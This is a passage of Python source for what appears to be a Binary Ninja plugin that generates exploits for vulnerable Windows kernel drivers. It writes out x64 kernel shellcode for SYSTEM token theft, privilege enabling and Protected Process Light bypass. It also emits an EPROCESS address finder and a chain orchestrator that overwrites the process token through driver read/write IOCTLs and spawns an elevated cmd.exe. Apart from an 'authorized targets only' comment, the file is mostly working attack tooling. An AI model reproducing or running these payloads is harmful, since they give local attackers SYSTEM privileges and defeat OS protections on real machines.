    a('    ULONG_PTR own_ep = handle_to_kva(hi, pid, hSelf); CloseHandle(hSelf);')
    a('    ULONG_PTR own_tok = handle_to_kva(hi, pid, hTok); CloseHandle(hTok);')
    a('    ULONG_PTR sys_ep = hSys ? handle_to_kva(hi, pid, hSys) : 0; if (hSys) CloseHandle(hSys);')
    a('')
    a('    char disk_path[MAX_PATH];')
    a('    ULONG_PTR kbase = get_ntoskrnl_base(disk_path, sizeof(disk_path));')
    a('    ULONG_PTR psis_kva = 0;')
    a('    HMODULE hMod = LoadLibraryExA(disk_path, NULL, DONT_RESOLVE_DLL_REFERENCES);')
    a('    if (hMod) {')
    a('        ULONG_PTR uva = (ULONG_PTR)GetProcAddress(hMod, "PsInitialSystemProcess");')
    a('        if (uva) psis_kva = kbase + (uva - (ULONG_PTR)hMod);')
    a('        FreeLibrary(hMod);')
    a('    }')
    a('')
    a('    printf("\\n[*] Own PID:        %llu\\n", (unsigned long long)pid);')
    a('    printf("[*] Own EPROCESS:   0x%llx\\n", (unsigned long long)own_ep);')
    a('    printf("[*] Own TOKEN:      0x%llx\\n", (unsigned long long)own_tok);')
    a('    printf("[*] SYSTEM EPROCESS:0x%llx\\n", (unsigned long long)sys_ep);')
    a('    printf("[*] ntoskrnl base:  0x%llx\\n", (unsigned long long)kbase);')
    a('    printf("[*] PsInitialSysP:  0x%llx\\n\\n", (unsigned long long)psis_kva);')
    a('')
    a('    printf("=== Copy-paste defines ===\\n");')
    a('    printf("#define OWN_EPROCESS       0x%llxULL\\n", (unsigned long long)own_ep);')
    a('    printf("#define OWN_TOKEN_KVA      0x%llxULL\\n", (unsigned long long)own_tok);')
    a('    printf("#define SYSTEM_EPROCESS    0x%llxULL\\n", (unsigned long long)sys_ep);')
    a('    printf("#define PSIS_KVA           0x%llxULL\\n", (unsigned long long)psis_kva);')
    a('    printf("#define NTOSKRNL_BASE      0x%llxULL\\n", (unsigned long long)kbase);')
    a('    printf("#define OFF_EPROCESS_TOKEN 0x%X\\n", off->token);')
    a('    printf("#define OFF_TOKEN_PRIV     0x%X\\n", off->priv);')
    a('    printf("#define OFF_ACTIVE_LINKS   0x%X\\n", off->links);')
    a('    printf("#define OFF_PID            0x%X\\n", off->pid);')
    a('    printf("#define OFF_PROTECTION     0x%X\\n", off->protection);')
    a('')
    a('    free(hi);')
    a('    puts("\\nPress Enter to exit..."); (void)getchar();')
    a('    return 0;')
    a('}')

    return '\n'.join(L) + '\n'


# ---------------------------------------------------------------------------
# 13f: Kernel Shellcode Payloads
# ---------------------------------------------------------------------------

def _emit_shellcode_header(driver_name):
    """Emit shellcode payload header with PIC token-steal and other payloads."""
    L = []
    def a(s): L.append(s)

    a('/*')
    a(' * Kernel shellcode payloads for: ' + driver_name)
    a(' * All payloads are PIC (position-independent code).')
    a(' * Offsets must be patched per-build using EPROCESS finder output.')
    a(' * Build: include this header, memcpy payload to RWX page.')
    a(' * USE ON AUTHORIZED TARGETS ONLY.')
    a(' */')
    a('#ifndef SHELLCODE_PAYLOADS_H')
    a('#define SHELLCODE_PAYLOADS_H')
    a('')
    a('#include <stdint.h>')
    a('')
    a('/* Offset placeholders - patch before use */')
    a('#define SC_OFF_PID            0x440')
    a('#define SC_OFF_ACTIVE_LINKS   0x448')
    a('#define SC_OFF_TOKEN          0x4b8')
    a('#define SC_OFF_PRIV_PRESENT   0x40')
    a('#define SC_OFF_PRIV_ENABLED   0x48')
    a('')
    a('/*')
    a(' * Payload 1: Token Steal')
    a(' * Walk EPROCESS.ActiveProcessLinks, find PID 4 (SYSTEM),')
    a(' * copy its Token to the current process.')
    a(' * ~80 bytes, x64 only.')
    a(' */')
    a('static const char sc_token_steal_stub[] =')
    a('    "\\x65\\x48\\x8b\\x04\\x25\\x88\\x01\\x00\\x00"  // mov rax, gs:[0x188] ; KTHREAD')
    a('    "\\x48\\x8b\\x80\\xb8\\x00\\x00\\x00"              // mov rax, [rax+0xB8] ; EPROCESS')
    a('    "\\x48\\x89\\xc3"                                  // mov rbx, rax        ; save own')
    a('    "\\x48\\x8b\\x80\\x48\\x04\\x00\\x00"              // mov rax, [rax+0x448] ; ActiveProcessLinks.Flink')
    a('    "\\x48\\x2d\\x48\\x04\\x00\\x00"                   // sub rax, 0x448       ; back to EPROCESS')
    a('    "\\x83\\xb8\\x40\\x04\\x00\\x00\\x04"              // cmp dword [rax+0x440], 4 ; PID == 4?')
    a('    "\\x75\\xea"                                        // jne loop (-22=0xEA)')
    a('    "\\x48\\x8b\\x88\\xb8\\x04\\x00\\x00"              // mov rcx, [rax+0x4b8] ; SYSTEM Token')
    a('    "\\x48\\x89\\x8b\\xb8\\x04\\x00\\x00"              // mov [rbx+0x4b8], rcx ; overwrite own')
    a('    "\\xc3"                                              // ret')
    a(';')
    a('')
    a('/*')
    a(' * NOTE: The stub above uses hardcoded offsets for Win10 2004+/Win11.')
    a(' * Before use, patch bytes at known positions:')
    a(' *   Offset 0x0C (12)  KTHREAD.Process (default 0xB8)')
    a(' *   Offset 0x16 (22)  EPROCESS.ActiveProcessLinks')
    a(' *   Offset 0x1C (28)  same offset for sub')
    a(' *   Offset 0x22 (34)  EPROCESS.UniqueProcessId')
    a(' *   Offset 0x2C (44)  EPROCESS.Token (read)')
    a(' *   Offset 0x33 (51)  EPROCESS.Token (write)')
    a(' */')
    a('')
    a('/*')
    a(' * Payload 2: Privilege Enable')
    a(' * Set _SEP_TOKEN_PRIVILEGES.Enabled = _SEP_TOKEN_PRIVILEGES.Present')
    a(' * on the current process token. Does not steal SYSTEM token.')
    a(' * ~60 bytes, x64.')
    a(' */')
    a('static const char sc_priv_enable_stub[] =')
    a('    "\\x65\\x48\\x8b\\x04\\x25\\x88\\x01\\x00\\x00"  // mov rax, gs:[0x188]')
    a('    "\\x48\\x8b\\x80\\xb8\\x00\\x00\\x00"              // mov rax, [rax+0xB8]  ; EPROCESS')
    a('    "\\x48\\x8b\\x80\\xb8\\x04\\x00\\x00"              // mov rax, [rax+0x4b8] ; Token (clear low 4)')
    a('    "\\x48\\x25\\xf0\\xff\\xff\\xff"                    // and rax, ~0xF')
    a('    "\\x48\\x8b\\x48\\x40"                              // mov rcx, [rax+0x40]  ; Priv.Present')
    a('    "\\x48\\x89\\x48\\x48"                              // mov [rax+0x48], rcx  ; Priv.Enabled = Present')
    a('    "\\xc3"                                              // ret')
    a(';')
    a('')
    a('/*')
    a(' * Payload 3: PPL Bypass')
    a(' * Clear EPROCESS.Protection (PS_PROTECTION) on current process.')
    a(' * Removes Protected Process Light restrictions.')
    a(' * ~40 bytes, x64.')
    a(' */')
    a('static const char sc_ppl_bypass_stub[] =')
    a('    "\\x65\\x48\\x8b\\x04\\x25\\x88\\x01\\x00\\x00"  // mov rax, gs:[0x188]')
    a('    "\\x48\\x8b\\x80\\xb8\\x00\\x00\\x00"              // mov rax, [rax+0xB8]  ; EPROCESS')
    a('    "\\xc6\\x80\\x7a\\x08\\x00\\x00\\x00"              // mov byte [rax+0x87a], 0 ; Protection = 0')
    a('    "\\xc3"                                              // ret')
    a(';')
    a('')
    a('/* Helper: patch a 4-byte offset in shellcode */')
    a('static inline void sc_patch_offset(void *sc, size_t pos, uint32_t new_offset) {')
    a('    memcpy((char *)sc + pos, &new_offset, 4);')
    a('}')
    a('')
    a('#endif /* SHELLCODE_PAYLOADS_H */')

    return '\n'.join(L) + '\n'


# ---------------------------------------------------------------------------
# 13g: Exploit Chain Orchestrator
# ---------------------------------------------------------------------------

def _emit_chain_orchestrator(driver_name, device_path, entries):
    """When multiple primitives exist, emit orchestrated exploit chain."""
    tags_all = set()
    for _, _, _, tags, _, _ in entries:
        tags_all.update(tags)

    has_read = 'arb_read' in tags_all
    has_write = 'write_what_where' in tags_all
    has_msr = 'msr_rw' in tags_all
    has_phys = 'phys_mem' in tags_all
    has_r0 = 'ring0_exec' in tags_all

    # Only emit if we have a viable chain
    if not (has_read and has_write) and not has_msr and not has_r0 and not has_phys:
        return None

    L = []
    def a(s): L.append(s)

    a('/*')
    a(' * Exploit chain orchestrator for: ' + driver_name)
    a(' * Sequences multiple primitives for full LPE.')
    a(' * Fill EPROCESS finder defines before running.')
    a(' * Build: cl /W3 /Zi ' + driver_name + '-chain.c')
    a(' * USE ON AUTHORIZED TARGETS ONLY.')
    a(' */')
    a('#include <windows.h>')
    a('#include <stdio.h>')
    a('#include <stdint.h>')
    a('#include <string.h>')
    a('')
    a('#define DEVICE_PATH  "' + device_path + '"')
    a('')
    a('/* Fill from EPROCESS finder */')
    a('#define NTOSKRNL_BASE      0x0ULL')
    a('#define SYSTEM_EPROCESS    0x0ULL')
    a('#define OWN_EPROCESS       0x0ULL')
    a('#define OFF_TOKEN          0x4b8')
    a('#define OFF_ACTIVE_LINKS   0x448')
    a('#define OFF_PID            0x440')
    a('')

    # Emit IOCTL codes for each primitive (deduplicate by tag+index)
    seen_tags = {}
    for idx, code, _, tags, _, _ in entries:
        for t in tags:
            n = seen_tags.get(t, 0)
            suffix = '_{}'.format(n) if n else ''
            a('#define IOCTL_{}{} 0x{:08X}'.format(t.upper(), suffix, code))
            seen_tags[t] = n + 1
    a('')

    a('static HANDLE g_dev = INVALID_HANDLE_VALUE;')
    a('')
    a('static int send_ioctl(DWORD code, void *in_buf, DWORD in_len, void *out_buf, DWORD out_len) {')
    a('    DWORD br = 0;')
    a('    return DeviceIoControl(g_dev, code, in_buf, in_len, out_buf, out_len, &br, NULL);')
    a('}')
    a('')

    if has_read and has_write:
        read_code = next(code for _, code, _, tags, _, _ in entries if 'arb_read' in tags)
        write_code = next(code for _, code, _, tags, _, _ in entries if 'write_what_where' in tags)
        a('/* --- Read + Write chain: Token Overwrite LPE --- */')
        a('#define IOCTL_CHAIN_READ  0x{:08X}'.format(read_code))
        a('#define IOCTL_CHAIN_WRITE 0x{:08X}'.format(write_code))
        a('')
        a('static uint64_t chain_read_qword(uint64_t addr) {')
        a('    uint64_t val = 0;')
        a('    send_ioctl(IOCTL_CHAIN_READ, &addr, sizeof(addr), &val, sizeof(val));')
        a('    return val;')
        a('}')
        a('')
        a('static int chain_write_qword(uint64_t where, uint64_t what) {')
        a('    struct { uint64_t addr; uint64_t val; } p = { where, what };')
        a('    return send_ioctl(IOCTL_CHAIN_WRITE, &p, sizeof(p), NULL, 0);')
        a('}')
        a('')
        a('static int exploit_read_write_lpe(void) {')
        a('    printf("[>] Chain: ARB_READ + WRITE_WHAT_WHERE -> Token Overwrite\\n");')
        a('    printf("    Step 1: Read SYSTEM token\\n");')
        a('    uint64_t sys_token = chain_read_qword(SYSTEM_EPROCESS + OFF_TOKEN);')
        a('    sys_token &= ~0xFULL; // Clear RefCnt')
        a('    printf("    SYSTEM Token: 0x%llx\\n", (unsigned long long)sys_token);')
        a('')
        a('    printf("    Step 2: Overwrite own process Token\\n");')
        a('    chain_write_qword(OWN_EPROCESS + OFF_TOKEN, sys_token);')
        a('    printf("    [+] Token overwritten\\n");')
        a('')
        a('    printf("    Step 3: Spawn elevated shell\\n");')
        a('    system("cmd.exe");')
        a('    return 1;')
        a('}')
        a('')

    a('int main(void) {')
    a('    printf("[*] Exploit chain orchestrator for ' + driver_name + '\\n");')
    a('    if (!NTOSKRNL_BASE || !OWN_EPROCESS) {')
    a('        printf("[!] Run EPROCESS finder and fill defines first\\n");')
    a('        return 1;')
    a('    }')
    a('    g_dev = CreateFileA(DEVICE_PATH, 0xC0000000, 3, NULL, 3, 0, NULL);')
    a('    if (g_dev == INVALID_HANDLE_VALUE) {')
    a('        printf("[!] Device open failed: %lu\\n", GetLastError());')
    a('        return 1;')
    a('    }')

    if has_read and has_write:
        a('    exploit_read_write_lpe();')
    elif has_r0:
        a('    printf("[>] Single-primitive chain: ring-0 exec -> token steal\\n");')
        a('    printf("[!] Use shellcode payloads header with ring0_exec IOCTL\\n");')
    elif has_msr:
        a('    printf("[>] Single-primitive chain: MSR write -> LSTAR hijack\\n");')
        a('    printf("[!] Use exploit templates file for LSTAR hijack\\n");')

    a('    CloseHandle(g_dev);')
    a('    return 0;')
    a('}')

    return '\n'.join(L) + '\n'


# ---------------------------------------------------------------------------
# Main entry
# ---------------------------------------------------------------------------

def _guess_sizes(text, method):
    """Crude buffer-size heuristic. METHOD_NEITHER uses raw pointers, BUFFERED uses SystemBuffer."""
    in_sz, out_sz = 0x100, 0x100
    # Larger default if any sizeof(<struct>) clues - we don't parse them, just pad.
    if 'OutputBufferLength' in text:
        out_sz = 0x400
    if 'InputBufferLength' in text:
        in_sz = 0x400
    if method == 'METHOD_NEITHER':
        in_sz = max(in_sz, 0x200)
        out_sz = max(out_sz, 0x200)
    return in_sz, out_sz


def generate_poc(bv: BinaryView):
    drv = os.path.splitext(os.path.basename(bv.file.filename))[0]
    out_dir = os.path.join(os.path.expanduser('~'), '.logs', 'WinDriverPOCs')
    os.makedirs(out_dir, exist_ok=True)
    c_path  = os.path.join(out_dir, drv + '-poc.c')
    py_path = os.path.join(out_dir, drv + '-poc.py')

    device = _detect_device(bv)
    device_path = _user_device_path(device)
    log_info("[poc] Device candidate: {} -> {}".format(device, device_path))

    dispatchers = find_dispatch_routines(bv)
    if not dispatchers:
        log_warn("[poc] No dispatcher found; emitting empty harness.")

    entries = []
    seen = set()
    idx = 0
    for df in dispatchers:
        branches = ioctl_branches_for_dispatcher(df)
        by_code = {}
        for code, instrs, _addr in branches:
            by_code.setdefault(code, []).extend(instrs)
        for code, instrs in sorted(by_code.items()):
            if code in seen:
                continue
            seen.add(code)
            text = deep_text(bv, instrs, max_depth=3)
            tags = _classify(text, bv=bv, instrs=instrs)
            d = ctl_decode(code)
            method = METHOD_MAP.get(d['method'], str(d['method']))
            in_sz, out_sz = _guess_sizes(text, method)
            entries.append((idx, code, method, tags, in_sz, out_sz))
            idx += 1

    if not entries:
        entries.append((0, 0xDEADBEEF, 'METHOD_BUFFERED', [], 0x100, 0x100))

    www_code  = next((code for _i, code, _m, tags, _is, _os in entries if 'write_what_where' in tags), 0)
    ainc_code = next((code for _i, code, _m, tags, _is, _os in entries if 'arb_increment'    in tags), 0)

    # 13a: Infer buffer structs from HLIL dereference patterns
    entries_with_structs = []
    for idx_e, code, method, tags, in_sz, out_sz in entries:
        combined_text = ''
        for df in dispatchers:
            branches = ioctl_branches_for_dispatcher(df)
            for bc, instrs, _addr in branches:
                if bc == code:
                    combined_text += deep_text(bv, instrs, max_depth=3)
        fields = _infer_buffer_struct(combined_text, code, tags)
        if fields:
            entries_with_structs.append((idx_e, code, fields))

    # Emit MASM syscall trampoline if MSR primitives detected
    has_msr_tags = any('msr_rw' in tags for _i, _c, _m, tags, _is, _os in entries)
    asm_path = os.path.join(out_dir, drv + '-trampoline.asm')

    outputs = [
        (c_path,  _emit_c(drv, device_path, entries),                              'C POC'),
        (py_path, _emit_py(drv, device_path, entries),                             'Python POC'),
        (os.path.join(out_dir, drv + '-eprocess-finder.c'),
         _emit_eprocess_finder_c(drv, device_path, www_code, ainc_code),           'EPROCESS finder (v1)'),
        (os.path.join(out_dir, drv + '-eprocess-finder-v2.c'),
         _emit_eprocess_finder_v2(drv, device_path, www_code, ainc_code),          'EPROCESS finder v2'),
        (os.path.join(out_dir, drv + '-poc.rs'),
         _emit_rust(drv, device_path, entries),                                    'Rust POC'),
        (os.path.join(out_dir, drv + '-poc.cs'),
         _emit_csharp(drv, device_path, entries),                                  'C# POC'),
        (os.path.join(out_dir, drv + '-probe-safe.c'),
         _emit_probe_safe(drv, device_path, entries),                              'Crash-safe probe'),
        (os.path.join(out_dir, drv + '-shellcode.h'),
         _emit_shellcode_header(drv),                                              'Shellcode payloads'),
        (os.path.join(out_dir, drv + '-exploit.c'),
         _emit_exploit_templates(drv, device_path, entries),                       'Exploit templates'),
    ]

    # MASM syscall trampoline for LSTAR hijack (driver-agnostic)
    if has_msr_tags:
        outputs.append((
            asm_path,
            _emit_asm_trampoline(drv),
            'MASM x64 syscall trampoline'))

    # 13a: Struct header if buffer layouts inferred
    if entries_with_structs:
        outputs.append((
            os.path.join(out_dir, drv + '-structs.h'),
            _emit_struct_header(entries_with_structs),
            'Inferred buffer structs'))

    # 13g: Chain orchestrator if viable chain exists
    chain_code = _emit_chain_orchestrator(drv, device_path, entries)
    if chain_code:
        outputs.append((
            os.path.join(out_dir, drv + '-chain.c'),
            chain_code,
            'Exploit chain orchestrator'))

    for path, content, label in outputs:
        try:
            with open(path, 'w') as f:
                f.write(content)
            log_info("[poc] wrote {}: {}".format(label, path))
        except Exception as e:
            log_warn("[poc] {} write failed: {}".format(label, e))

    log_info("[poc] Generated {} IOCTL stubs across {} output files for {} (device {})".format(
        len(entries), len(outputs), drv, device_path))


PluginCommand.register(
    "Windows Driver Analysis\\Generate POC (C + Python + Rust + C# + Exploit Templates)",
    "Emit multi-language POC scaffolding with exploit templates, shellcode payloads, and chain orchestrator",
    generate_poc,
)
